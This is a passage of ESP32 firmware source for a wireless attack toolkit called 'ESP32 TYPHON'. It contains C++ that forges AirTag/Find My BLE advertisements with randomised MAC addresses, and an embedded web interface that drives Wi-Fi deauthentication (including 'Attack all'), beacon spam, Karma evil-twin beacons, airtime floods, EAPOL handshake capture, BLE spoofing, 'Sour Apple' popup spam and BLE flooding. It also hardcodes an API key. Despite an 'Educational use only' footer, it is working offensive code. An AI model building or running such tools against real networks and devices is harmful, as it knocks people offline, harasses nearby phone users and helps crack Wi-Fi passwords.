  AirTagDev& d = airTags[idx];
  if (d.payloadLen < 4) {
    uint8_t pkt[31];
    pkt[0] = 0x1E; pkt[1] = 0xFF; pkt[2] = 0x4C; pkt[3] = 0x00;
    pkt[4] = 0x12; pkt[5] = 0x19; pkt[6] = 0x00;
    for (int i = 7; i < 31; i++) pkt[i] = (uint8_t)esp_random();
    memcpy(d.payload, pkt, 31);
    d.payloadLen = 31;
  }

  uint8_t mac[6];
  if (parseMacStr(d.addr, mac)) {
    // BLE random static: keep top bits 11 as required by stack
    mac[0] = (uint8_t)((mac[0] & 0x3F) | 0xC0);
    esp_ble_gap_set_rand_addr(mac);
  } else if ((airTagSent % 5) == 1) {
    mac[0] = (uint8_t)((esp_random() & 0x3F) | 0xC0);
    for (int i = 1; i < 6; i++) mac[i] = (uint8_t)esp_random();
    esp_ble_gap_set_rand_addr(mac);
  }

  if (d.payloadLen < 4) return; // Wave 2: do not spam empty synthetic unless seeded
  esp_ble_gap_config_adv_data_raw(d.payload, d.payloadLen);
  esp_ble_gap_start_advertising(&airAdvParams);
}

static void airTagStart() {
  airTagMode = 0;
  airTagRunning = false;
  airDetRunning = false;
  airSpoofRunning = false;
  bleInit();
  esp_ble_gap_stop_advertising();
}

static void airTagStop() {
  airDetStop();
  airSpoofStop();
  airTagRunning = false;
  airTagMode = 0;
}

static void airTagBeginSpoof() {
  if (airTagCount == 0) {
    airTagCount = 1;
    strcpy(airTags[0].addr, "00:00:00:00:00:00");
    strcpy(airTags[0].name, "Synthetic");
    airTags[0].rssi = -50;
    airTags[0].lastSeen = millis();
    uint8_t pkt[31];
    pkt[0] = 0x1E; pkt[1] = 0xFF; pkt[2] = 0x4C; pkt[3] = 0x00;
    pkt[4] = 0x12; pkt[5] = 0x19;
    for (int i = 6; i < 31; i++) pkt[i] = (uint8_t)esp_random();
    memcpy(airTags[0].payload, pkt, 31);
    airTags[0].payloadLen = 31;
  }
  airSpoofStart(-1);
}

static void airTagUpdate() {
  airDetUpdate();
  airSpoofUpdate();
}

// ============================================================
//  Soft-AP Web UI – full handlers (after all tools are defined)
// ============================================================

static const char WEB_PAGE[] PROGMEM = R"HTML(
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>ESP32 TYPHON</title>
<style>
:root{--bg:#000000;--card:#0a0f0a;--line:#1a2e1a;--acc:#00ff66;--ok:#00ff66;--warn:#ffb020;--err:#ff3333;--fg:#ffffff;--dim:#7a9a7a;--r:14px}
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:system-ui,-apple-system,Segoe UI,Roboto,sans-serif;background:var(--bg);color:var(--fg);min-height:100vh}
.top{position:sticky;top:0;z-index:20;background:rgba(7,11,16,.94);backdrop-filter:blur(10px);border-bottom:1px solid var(--line);padding:12px 14px}
.brand{display:flex;align-items:center;justify-content:space-between;gap:10px}
.brand h1{font-size:1.05rem;color:var(--acc)}
.mode{font-size:.78rem;font-weight:700;letter-spacing:.04em;text-transform:uppercase;padding:6px 12px;border-radius:999px;border:1px solid var(--line)}
.mode.idle{background:#0a0a0a;color:var(--dim)}
.mode.scanning{background:#001a0a;color:var(--acc);border-color:#00aa44}
.mode.attacking{background:#1a0505;color:var(--err);border-color:#aa2222}
.mode.defending{background:#001a0a;color:var(--ok);border-color:#00aa44}
.stats{margin-top:8px;font-size:.78rem;color:var(--dim)}
.stats b{color:var(--fg)}
.wrap{max-width:720px;margin:0 auto;padding:14px}
.view{display:none}.view.active{display:block}
.grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
@media(max-width:420px){.grid{grid-template-columns:1fr}}
.tile{background:linear-gradient(160deg,var(--card),#050805);border:1px solid var(--line);border-radius:var(--r);padding:18px 14px;cursor:pointer}
.tile:active{transform:scale(.98)}
.tile .ico{font-size:1.35rem;margin-bottom:8px}
.tile h2{font-size:.95rem;margin-bottom:4px}
.tile p{font-size:.75rem;color:var(--dim);line-height:1.35}
.card{background:var(--card);border:1px solid var(--line);border-radius:var(--r);padding:14px;margin-bottom:12px}
.card h3{font-size:.9rem;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;gap:8px}
.row{display:flex;flex-wrap:wrap;gap:8px;margin-top:10px;align-items:center}
button{appearance:none;border:0;border-radius:10px;padding:12px 16px;font-size:.9rem;font-weight:600;cursor:pointer;background:var(--acc);color:#000}
button.sec{background:#111;color:var(--fg);border:1px solid var(--line)}
button.danger{background:var(--err);color:#fff}
button.on{background:var(--err);color:#fff}
button.attack{background:var(--err);color:#fff}
button:disabled{opacity:.45}
select,input{background:#050805;border:1px solid var(--line);color:var(--fg);border-radius:10px;padding:10px 12px;font-size:.88rem;width:100%}
#customSsidBox{display:none;margin-top:8px}
#customSsidBox.show{display:block}
.ssidRow{margin-bottom:6px}
label.lbl{font-size:.75rem;color:var(--dim);display:block;margin:8px 0 4px}
.list{margin-top:8px;max-height:320px;overflow:auto;border:1px solid var(--line);border-radius:10px}
.item{display:flex;justify-content:space-between;gap:8px;padding:10px 12px;border-bottom:1px solid var(--line);font-size:.82rem;align-items:flex-start}
.item:last-child{border-bottom:0}
.item .meta{color:var(--dim);font-size:.72rem;margin-top:2px}
.item.active{background:#0a2a12;border-left:3px solid var(--acc)}
.dot{display:inline-block;width:8px;height:8px;border-radius:50%;background:var(--ok);margin-right:6px;vertical-align:middle}
.rssi-g{color:#2ee59d}.rssi-y{color:#ffd84d}.rssi-o{color:#ffb020}.rssi-r{color:#ff5a6a}
.enc{font-size:.7rem;padding:2px 7px;border-radius:6px;background:#1a2736;color:var(--dim);margin-left:6px}
.nav{display:flex;gap:8px;align-items:center;margin-bottom:12px}
.back{background:transparent;color:var(--acc);border:1px solid var(--line);padding:8px 12px;font-size:.8rem}
.msg{min-height:1.1em;font-size:.78rem;color:var(--dim);margin-top:8px}
.footer{text-align:center;color:var(--dim);font-size:.72rem;padding:18px 8px 28px}
.bar{height:5px;background:#1a2736;border-radius:99px;overflow:hidden;margin-top:8px}
.bar>i{display:block;height:100%;width:0;background:var(--acc);transition:width .25s}
.stopall{width:100%;margin-top:12px}
.targetBar{background:#0a1a0a;border:1px solid var(--acc);border-radius:10px;padding:10px 12px;margin-bottom:12px;font-size:.85rem}
.targetBar .lbl{color:var(--dim);font-size:.7rem;text-transform:uppercase;letter-spacing:.06em;margin-bottom:4px}
.targetBar .val{color:var(--acc);font-weight:700;font-size:.95rem;word-break:break-all}
.targetBar.empty .val{color:var(--err);font-weight:600}
</style>
</head>
<body>
<div class="top">
  <div class="brand">
    <h1>ESP32 TYPHON</h1>
    <span id="modePill" class="mode idle">Idle</span>
  </div>
  <div class="stats">Temp <b id="temp">—</b> °C</div>
</div>
<div class="wrap">
<div class="card" style="border-color:#3a3;margin:0.5rem 0"><div class="msg"><b>Web-safe mode</b> — Soft-AP stays on CH1. Wi‑Fi attacks only affect CH1. Off-channel deauth/probe/sniff/EAPOL need <b>handheld</b>. BLE tools OK.</div></div>


<div id="v-home" class="view active">
  <div class="grid">
    <div class="tile" onclick="go('wifi')"><div class="ico">📡</div><h2>Wi‑Fi Tools</h2><p>Scan, monitor, beacon, deauth, probe</p></div>
    <div class="tile" onclick="go('ble')"><div class="ico">🔵</div><h2>Bluetooth</h2><p>Scan, sniff, spoof, Sour Apple, jam, AirTag detect/spoof</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
  <div class="msg" id="sysMsg"></div>
</div>

<div id="v-wifi" class="view">
  <div class="nav"><button class="back" onclick="go('home')">← Home</button><h2 style="font-size:1rem">Wi‑Fi Tools</h2></div>
  <div class="grid">
    <div class="tile" onclick="go('wifi-scan')"><div class="ico">🔍</div><h2>Scanner</h2><p>Nearby access points</p></div>
    <div class="tile" onclick="go('wifi-pm')"><div class="ico">📊</div><h2>Packet Monitor</h2><p>Channel activity</p></div>
    <div class="tile" onclick="go('wifi-beacon')"><div class="ico">📢</div><h2>Beacon Spam</h2><p>List or clone SSIDs</p></div>
    <div class="tile" onclick="go('wifi-deauth')"><div class="ico">⚡</div><h2>Deauth</h2><p>Broadcast + clients</p></div>
    <div class="tile" onclick="go('wifi-clients')"><div class="ico">👥</div><h2>Client Sniffer</h2><p>STAs on an AP</p></div>
    <div class="tile" onclick="go('wifi-karma')"><div class="ico">🎭</div><h2>Karma</h2><p>Probe→evil beacons</p></div>
    <div class="tile" onclick="go('wifi-flood')"><div class="ico">🌪</div><h2>Airtime Flood</h2><p>RTS/CTS/Auth</p></div>
    <div class="tile" onclick="go('wifi-eapol')"><div class="ico">🔑</div><h2>EAPOL Capture</h2><p>Handshake/PMKID</p></div>
    <div class="tile" onclick="act('war_on')"><div class="ico">☢</div><h2>War Mode</h2><p>Max TX · no AP</p></div>

    <div class="tile" onclick="go('wifi-det')"><div class="ico">🛡</div><h2>Deauth Detector</h2><p>Watch for attacks</p></div>
    <div class="tile" onclick="go('wifi-probe')"><div class="ico">📨</div><h2>Probe Flood</h2><p>Probe requests</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
</div>

<div id="v-ble" class="view">
  <div class="nav"><button class="back" onclick="go('home')">← Home</button><h2 style="font-size:1rem">Bluetooth</h2></div>
  <div class="grid">
    <div class="tile" onclick="go('ble-scan')"><div class="ico">🔎</div><h2>BLE Scanner</h2><p>Nearby devices</p></div>
    <div class="tile" onclick="go('ble-sniff')"><div class="ico">👁</div><h2>BLE Sniffer</h2><p>Continuous scan</p></div>
    <div class="tile" onclick="go('ble-spoof')"><div class="ico">🎭</div><h2>BLE Spoofer</h2><p>Fake names</p></div>
    <div class="tile" onclick="go('ble-sour')"><div class="ico">🍎</div><h2>Sour Apple</h2><p>Pick model / action</p></div>
    <div class="tile" onclick="go('ble-jam')"><div class="ico">📻</div><h2>BLE ADV Flood</h2><p>Noise flood</p></div>
    <div class="tile" onclick="go('ble-airdet')"><div class="ico">📍</div><h2>AirTag Detector</h2><p>Find nearby AirTags</p></div>
    <div class="tile" onclick="go('ble-air')"><div class="ico">🏷</div><h2>AirTag Spoofer</h2><p>Clone / spam payloads</p></div>
  </div>
  <button class="danger stopall" onclick="act('stop_all')">Stop all tools</button>
</div>

<div id="v-wifi-scan" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Wi‑Fi Scanner</h2></div>
  <div class="card">
    <h3>Scanner</h3>
    <div class="row"><button id="btnWifiScan" onclick="act('wifi_scan')">Start scan</button></div>
    <div class="bar"><i id="wscanBar"></i></div>
    <div class="msg" id="wscanMsg">Previous results stay until a new scan finishes</div>
    <div class="list" id="wifiList"></div>
  </div>
</div>

<div id="v-wifi-pm" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Packet Monitor</h2></div>
  <div class="card">
    <h3>Monitor</h3>
    <label class="lbl">Channel (1–13)</label>
    <input type="number" id="pmCh" min="1" max="13" value="1">
    <label class="lbl"><input type="checkbox" id="pmHop"> Hop channels</label>
    <div class="row"><button id="btnPm" onclick="toggle('pm')">Start</button></div>
    <div class="msg">Pkts <b id="pmTotal">0</b> · CH <b id="pmChLive">1</b> · RSSI <b id="pmRssi">—</b></div>
    <div class="msg">MGMT <b id="pmMgmt">0</b> · DATA <b id="pmData">0</b> · CTRL <b id="pmCtrl">0</b> · Deauth/Disassoc <b id="pmDeauth">0</b></div>
  </div>
</div>

<div id="v-wifi-beacon" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Beacon Spammer</h2></div>
  <div class="card">
    <h3>Beacon</h3>
    <label class="lbl">Mode</label>
    <select id="beaconMode" onchange="onBeaconMode()">
      <option value="0">Funny SSID list</option>
      <option value="1">Clone scanned SSIDs</option>
      <option value="2">Add list of SSIDs</option>
    </select>
    <div id="customSsidBox">
      <label class="lbl">How many SSIDs (1–10)</label>
      <select id="ssidCount" onchange="buildSsidInputs()">
        <option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
        <option>6</option><option>7</option><option>8</option><option>9</option><option>10</option>
      </select>
      <div id="ssidInputs" style="margin-top:8px"></div>
    </div>
    <div class="row"><button id="btnBeacon" class="attack" onclick="toggle('beacon')">Start</button></div>
    <div class="msg">Sent: <b id="beaconSent">0</b></div>
  </div>
</div>

<div id="v-wifi-deauth" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Attack</h2></div>
  <div class="card">
    <div class="targetBar empty" id="deauthTargetBar"><div class="lbl">Selected target</div><div class="val" id="deauthTargetLabel">None — tap a network below</div></div>
    <div class="msg">Broadcast deauth + unicast to sniffed clients. Run <b>Client Sniffer</b> on the same AP first for best results.</div>
    <div class="list" id="deauthList"></div>
    <div class="row">
      <button id="btnDeauth" class="attack" onclick="toggle('deauth')">Start</button>
      <button class="sec" onclick="act('deauth_start',{target:-1})">Attack all</button>
    </div>
    <div class="msg">Sent: <b id="deauthSent">0</b> · Clients loaded: <b id="deauthClientCount">0</b></div>
  </div>
</div>

<div id="v-wifi-clients" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Client Sniffer</h2></div>
  <div class="card">
    <div class="targetBar empty" id="clientTargetBar"><div class="lbl">AP under watch</div><div class="val" id="clientTargetLabel">None — tap a network below</div></div>
    <div class="msg">Passively collects station MACs talking to the selected AP. Use before Deauth for unicast kicks.</div>
    <div class="list" id="clientApList"></div>
    <div class="row">
      <button id="btnClientSniff" onclick="toggleClientSniff()">Start sniff</button>
      <button class="sec" onclick="go('wifi-deauth')">→ Deauth</button>
    </div>
    <div class="msg">Stations: <b id="clientCount">0</b></div>
    <div class="list" id="clientMacList"></div>
  </div>
</div>

<div id="v-wifi-karma" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Karma</h2></div>
  <div class="card">
    <div class="msg">Answers probe requests with open beacons (lab only). CH:
      <input id="karmaCh" type="number" min="1" max="13" value="1" style="width:3rem">
    </div>
    <div class="row">
      <button id="btnKarma" class="attack" onclick="toggleKarma()">Start</button>
    </div>
    <div class="msg">SSIDs learned: <b id="karmaCount">0</b> · Beacons: <b id="karmaSent">0</b></div>
  </div>
</div>
<div id="v-wifi-flood" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Airtime Flood</h2></div>
  <div class="card">
    <div class="targetBar empty" id="floodTargetBar"><div class="lbl">Target AP</div><div class="val" id="floodTargetLabel">Select from scan</div></div>
    <div class="list" id="floodList"></div>
    <div class="msg">Mode:
      <select id="floodMode"><option value="0">RTS</option><option value="1">CTS</option><option value="2">Auth</option><option value="3">Mix</option></select>
    </div>
    <div class="row"><button id="btnFlood" class="attack" onclick="toggleFlood()">Start</button></div>
    <div class="msg">Sent: <b id="floodSent">0</b></div>
  </div>
</div>
<div id="v-wifi-eapol" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">EAPOL Capture</h2></div>
  <div class="card">
    <div class="msg">Channel: <input id="eapolCh" type="number" min="1" max="13" value="1" style="width:3rem"></div>
    <div class="row"><button id="btnEapol" onclick="toggleEapol()">Start capture</button></div>
    <div class="msg">Hits: <b id="eapolCount">0</b> · Heap: <b id="heapOut">0</b></div>
  </div>
</div>
<div id="v-wifi-det" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Deauth Detector</h2></div>
  <div class="card">
    <h3>Detector</h3>
    <div class="row"><button id="btnDet" onclick="toggle('det')">Start</button></div>
    <div class="msg">Detected frames: <b id="detCount">0</b></div>
  </div>
</div>

<div id="v-wifi-probe" class="view">
  <div class="nav"><button class="back" onclick="go('wifi')">← Wi‑Fi</button><h2 style="font-size:1rem">Probe Flood</h2></div>
  <div class="card">
    <div class="targetBar empty" id="probeTargetBar"><div class="lbl">Selected target</div><div class="val" id="probeTargetLabel">None — tap a network below</div></div>
    <div class="msg">Scan Wi‑Fi first, then tap a network to stress-test</div>
    <div class="list" id="probeList"></div>
    <div class="row"><button id="btnProbe" class="attack" onclick="toggle('probe')">Start</button></div>
    <div class="msg">Sent: <b id="probeSent">0</b></div>
  </div>
</div>

<div id="v-ble-scan" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Scanner</h2></div>
  <div class="card">
    <h3>Scan</h3>
    <div class="row"><button id="btnBleScan" onclick="act('ble_scan')">Start scan</button></div>
    <div class="bar"><i id="bscanBar"></i></div>
    <div class="list" id="bleList"></div>
  </div>
</div>

<div id="v-ble-sniff" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Sniffer</h2></div>
  <div class="card">
    <h3>Sniffer</h3>
    <div class="row"><button id="btnSniff" onclick="toggle('sniff')">Start</button></div>
    <div class="msg">Suspicious <b id="bleSus">0</b> · Flood alerts <b id="bleFlood">0</b></div>
    <div class="list" id="bleList2"></div>
  </div>
</div>

<div id="v-ble-spoof" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE Spoofer</h2></div>
  <div class="card">
    <h3>Advertise</h3>
    <label class="lbl">Mode</label>
    <select id="spoofMode">
      <option value="0">Apple Continuity (raw)</option>
      <option value="1">Samsung Galaxy Watch</option>
      <option value="2">Google Fast Pair</option>
      <option value="3">Rotating name list</option>
      <option value="4">Clone scanned BLE names</option>
      <option value="5">Custom name</option>
    </select>
    <label class="lbl">Custom name (mode 5)</label>
    <input id="spoofName" placeholder="My Device" maxlength="28">
    <label class="lbl">TX power (0–9)</label>
    <input type="number" id="spoofPower" min="0" max="9" value="9">
    <label class="lbl">ADV interval (16–160)</label>
    <input type="number" id="spoofInterval" min="16" max="160" value="32">
    <div class="row"><button id="btnSpoof" class="attack" onclick="toggle('spoof')">Start</button></div>
  </div>
</div>

<div id="v-ble-sour" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">Sour Apple</h2></div>
  <div class="card">
    <div class="targetBar" id="sourTargetBar"><div class="lbl">Selected target</div><div class="val" id="sourTargetLabel">Random Mix</div></div>
    <label class="lbl">Model / action</label>
    <select id="sourIdx" onchange="onSourChange()"><option value="-1">Random Mix</option></select>
    <div class="row"><button id="btnSour" class="attack" onclick="toggle('sour')">Start</button></div>
    <div class="msg">Sent: <b id="sourSent">0</b> · Active: <b id="sourName">—</b></div>
  </div>
</div>

<div id="v-ble-jam" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">BLE ADV Flood</h2></div>
  <div class="card">
    <h3>Noise</h3>
    <div class="row"><button id="btnJam" class="attack" onclick="toggle('jam')">Start</button></div>
    <div class="msg">Noise packets: <b id="jamCount">0</b></div>
  </div>
</div>

<div id="v-ble-airdet" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">AirTag Detector</h2></div>
  <div class="card">
    <div class="targetBar empty" id="airDetTargetBar"><div class="lbl">Selected target</div><div class="val" id="airSelectedLabel">None — tap a device below</div></div>
    <div class="row"><button id="btnAirDet" onclick="toggleAirDet()">Start scan</button></div>
    <div class="msg">Found: <b id="airCount">0</b></div>
    <div class="list" id="airList"></div>
    <div class="row" style="margin-top:10px">
      <button class="attack" id="btnAirSpoofSel" onclick="spoofSelectedAir()">Spoof selected</button>
      <button class="sec" onclick="go('ble-air')">Open spoofer →</button>
    </div>
  </div>
</div>

<div id="v-ble-air" class="view">
  <div class="nav"><button class="back" onclick="go('ble')">← Bluetooth</button><h2 style="font-size:1rem">AirTag Spoofer</h2></div>
  <div class="card">
    <div class="targetBar" id="airSpoofTargetBar"><div class="lbl">Selected target</div><div class="val" id="airSpoofTargetLabel">Spam all / synthetic</div></div>
    <div class="msg">Use Detector first for real payloads. Synthetic Find My ADV if list is empty.</div>
    <label class="lbl">Target</label>
    <select id="airTarget" onchange="onAirTargetChange()"><option value="-1">Spam all / synthetic</option></select>
    <div class="row">
      <button id="btnAir" class="attack" onclick="toggle('air')">Start</button>
      <button class="sec" onclick="go('ble-airdet')">← Detector</button>
    </div>
    <div class="msg">Sent: <b id="airSent">0</b> · Captured: <b id="airCount2">0</b></div>
  </div>
</div>

<div class="footer">Hold BOOT 2s to exit web mode · Educational use only</div>
</div>
<script>
let deauthTarget=-1, appleReady=false, S={};
function go(id){document.querySelectorAll('.view').forEach(v=>v.classList.remove('active'));const e=document.getElementById('v-'+id);if(e)e.classList.add('active');}
function onBeaconMode(){
  const m=document.getElementById('beaconMode').value;
  document.getElementById('customSsidBox').classList.toggle('show', m==='2');
  if(m==='2') buildSsidInputs();
}
function buildSsidInputs(){
  const n=parseInt(document.getElementById('ssidCount').value)||1;
  const box=document.getElementById('ssidInputs');
  let h='';
  for(let i=0;i<n;i++) h+=`<div class="ssidRow"><input id="ssid${i}" maxlength="32" placeholder="SSID ${i+1}"></div>`;
  box.innerHTML=h;
}
function esc(s){return String(s||'').replace(/[<>&]/g,c=>({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));}
function rssiClass(r){if(r>=-55)return'rssi-g';if(r>=-70)return'rssi-y';if(r>=-80)return'rssi-o';return'rssi-r';}
function wifiItem(n,i,clickable){
  const open=!!n.open;
  const enc=esc(n.enc|| (open?'Open':'Secured'));
  const dot=open?'<span class="dot" title="Open network"></span>':'';
  const onclick=clickable?`onclick="pickDeauth(${i})"`:'';
  const active=(clickable&&deauthTarget===i)?' active':'';
  return `<div class="item${active}" ${onclick}>
    <div>${dot}<b>${esc(n.ssid)}</b><span class="enc">${enc}</span>
      <div class="meta">${esc(n.bssid||'')} · CH ${n.ch}</div></div>
    <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
}
function renderWifi(list){
  const empty='<div class="item"><span>No networks yet — run a scan</span></div>';
  if(!list||!list.length){document.getElementById('wifiList').innerHTML=empty;document.getElementById('deauthList').innerHTML=empty;return;}
  document.getElementById('wifiList').innerHTML=list.map((n,i)=>wifiItem(n,i,false)).join('');
  document.getElementById('deauthList').innerHTML=list.map((n,i)=>wifiItem(n,i,true)).join('');
}
function renderBle(list){
  const html=(!list||!list.length)?'<div class="item"><span>No devices yet — run a scan</span></div>':
    list.map(n=>{
      const tags=(n.sus?' ⚠':'')+(n.rand?' rnd':'');
      const hits=n.hits?(' · '+n.hits+' hits'):'';
      return `<div class="item"><div><b>${esc(n.name)}</b>${n.sus?'<span class="enc" style="color:var(--err)">SUS</span>':''}
        <div class="meta">${esc(n.addr||'')}${hits}${tags}</div></div>
        <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
    }).join('');
  document.getElementById('bleList').innerHTML=html;
  document.getElementById('bleList2').innerHTML=html;
}
function setTargetBar(barId,labelId,text,isEmpty){
  const bar=document.getElementById(barId);
  const lab=document.getElementById(labelId);
  if(lab) lab.textContent=text||'None';
  if(bar) bar.classList.toggle('empty', !!isEmpty);
}
function pickDeauth(i){
  deauthTarget=i;
  renderWifi(S.wifi||[]);
  const list=S.wifi||[];
  if(list[i]) setTargetBar('deauthTargetBar','deauthTargetLabel', list[i].ssid+' · CH'+list[i].ch+' · '+(list[i].bssid||''), false);
  else setTargetBar('deauthTargetBar','deauthTargetLabel','None — tap a network below', true);
}
let probeTarget=-1;
function pickProbe(i){
  probeTarget=i;
  renderProbe(S.wifi||[]);
  const list=S.wifi||[];
  if(list[i]) setTargetBar('probeTargetBar','probeTargetLabel', list[i].ssid+' · CH'+list[i].ch+' · '+(list[i].bssid||''), false);
  else setTargetBar('probeTargetBar','probeTargetLabel','None — tap a network below', true);
}
function renderProbe(list){
  const el=document.getElementById('probeList');
  if(!el) return;
  const empty='<div class="item"><span>No networks — run Wi‑Fi scan first</span></div>';
  if(!list||!list.length){el.innerHTML=empty;return;}
  el.innerHTML=list.map((n,i)=>{
    const act=(probeTarget===i)?' active':'';
    return `<div class="item${act}" onclick="pickProbe(${i})">
      <div><b>${esc(n.ssid)}</b><span class="enc">${esc(n.enc||'')}</span>
        <div class="meta">${esc(n.bssid||'')} · CH ${n.ch}</div></div>
      <div class="${rssiClass(n.rssi)}">${n.rssi} dBm</div></div>`;
  }).join('');
}
function fillApple(names){if(appleReady||!names)return;const sel=document.getElementById('sourIdx');names.forEach((n,i)=>{const o=document.createElement('option');o.value=i;o.textContent=n;sel.appendChild(o);});appleReady=true;}
function setToggle(id,on){const b=document.getElementById(id);if(!b)return;b.textContent=on?'Stop':'Start';b.classList.toggle('on',!!on);}
function setMode(m){
  const el=document.getElementById('modePill');
  const map={idle:['Idle','idle'],scanning:['Scanning','scanning'],attacking:['Attacking','attacking'],defending:['Defending','defending']};
  const x=map[m]||map.idle; el.textContent=x[0]; el.className='mode '+x[1];
}
function apply(s){
  S=s||{};
  setMode(s.mode||'idle');
  document.getElementById('temp').textContent=(s.temp!=null)?Number(s.temp).toFixed(1):'—';
  const wr=document.getElementById('warRadio'); if(wr) wr.textContent=(s.war?'WAR ':'')+(s.radio||'');
  setToggle('btnPm',s.pm); setToggle('btnBeacon',s.beacon); setToggle('btnDeauth',s.deauth);
  setToggle('btnClientSniff',s.clientSniff);
  setToggle('btnKarma',s.karma); setToggle('btnFlood',s.flood); setToggle('btnEapol',s.eapol);
  const ks=document.getElementById('karmaSent'); if(ks) ks.textContent=s.karmaSent||0;
  const kc=document.getElementById('karmaCount'); if(kc) kc.textContent=s.karmaCount||0;
  const fs=document.getElementById('floodSent'); if(fs) fs.textContent=s.floodSent||0;
  const ec=document.getElementById('eapolCount'); if(ec) ec.textContent=s.eapolCount||0;
  const ho=document.getElementById('heapOut'); if(ho) ho.textContent=s.heap||0;
  if(s.wifi) renderFloodList(s.wifi);
  const dcc=document.getElementById('deauthClientCount'); if(dcc) dcc.textContent=s.clientCount||0;
  const cc=document.getElementById('clientCount'); if(cc) cc.textContent=s.clientCount||0;
  if(s.wifi) renderClientApList(s.wifi); if(s.clients) renderClientMacs(s.clients);
  setToggle('btnDet',s.det); setToggle('btnProbe',s.probe); setToggle('btnSpoof',s.spoof);
  setToggle('btnSour',s.sour); setToggle('btnJam',s.jam); setToggle('btnAir',s.air); setToggle('btnSniff',s.sniff);
  document.getElementById('wscanBar').style.width=s.wifiScanning?'75%':'0%';
  document.getElementById('bscanBar').style.width=s.bleScanning?'75%':'0%';
  document.getElementById('btnWifiScan').textContent=s.wifiScanning?'Scanning…':'Start scan';
  document.getElementById('btnWifiScan').disabled=!!s.wifiScanning;
  document.getElementById('btnBleScan').textContent=s.bleScanning?'Scanning…':'Start scan';
  document.getElementById('btnBleScan').disabled=!!s.bleScanning;
  document.getElementById('pmTotal').textContent=s.pmTotal||0;
  document.getElementById('pmChLive').textContent=s.pmCh||1;
  const pr=document.getElementById('pmRssi'); if(pr) pr.textContent=(s.pmRssi!=null)?s.pmRssi:'—';
  const a=['pmMgmt','pmData','pmCtrl','pmDeauth','bleSus','bleFlood'];
  a.forEach(k=>{const e=document.getElementById(k); if(e) e.textContent=s[k]||0;});
  document.getElementById('beaconSent').textContent=s.beaconSent||0;
  document.getElementById('deauthSent').textContent=s.deauthSent||0;
  document.getElementById('detCount').textContent=s.detCount||0;
  document.getElementById('probeSent').textContent=s.probeSent||0;
  document.getElementById('jamCount').textContent=s.jamCount||0;
  document.getElementById('airSent').textContent=s.airSent||0;
  const ac=s.airCount||0;
  const ace=document.getElementById('airCount'); if(ace) ace.textContent=ac;
  const ac2=document.getElementById('airCount2'); if(ac2) ac2.textContent=ac;
  setToggle('btnAirDet', s.airDet);
  setToggle('btnAir', s.air);
  if(s.airtags){renderAir(s.airtags);fillAirTargets(s.airtags);}
  if(airSelected>=0 && s.airtags && s.airtags[airSelected]){
    const t=(s.airtags[airSelected].name||'AirTag')+' · '+(s.airtags[airSelected].addr||'');
    setTargetBar('airDetTargetBar','airSelectedLabel', t, false);
    setTargetBar('airSpoofTargetBar','airSpoofTargetLabel', t, false);
  }
  document.getElementById('sourSent').textContent=s.sourSent||0;
  document.getElementById('sourName').textContent=s.sourName||'—';
  document.getElementById('wscanMsg').textContent=s.wifiScanning?'Scanning… keeping previous list until done':((s.wifi&&s.wifi.length)?(s.wifi.length+' networks'):'No networks yet');
  if(s.wifi){S.wifi=s.wifi;renderWifi(s.wifi);renderProbe(s.wifi);}
  if(s.ble){S.ble=s.ble;renderBle(s.ble);}
  if(s.apple) fillApple(s.apple);
  if(probeTarget>=0 && s.wifi && s.wifi[probeTarget]){
    const n=s.wifi[probeTarget];
    setTargetBar('probeTargetBar','probeTargetLabel', n.ssid+' · CH'+n.ch+' · '+(n.bssid||''), false);
  }
  if(typeof deauthTarget==='number' && deauthTarget>=0 && s.wifi && s.wifi[deauthTarget]){
    const n=s.wifi[deauthTarget];
    setTargetBar('deauthTargetBar','deauthTargetLabel', n.ssid+' · CH'+n.ch+' · '+(n.bssid||''), false);
  }
  if(s.sourName) setTargetBar('sourTargetBar','sourTargetLabel', s.sourName, false);
}
const API_KEY='rgisking';
async function apiGet(path){const r=await fetch(path+(path.indexOf('?')>=0?'&':'?')+'key='+encodeURIComponent(API_KEY),{headers:{'X-TYPHON-KEY':API_KEY}});if(!r.ok)throw new Error('auth');return r.json();}
async function refresh(){try{apply(await apiGet('/api/status'));}catch(e){}}
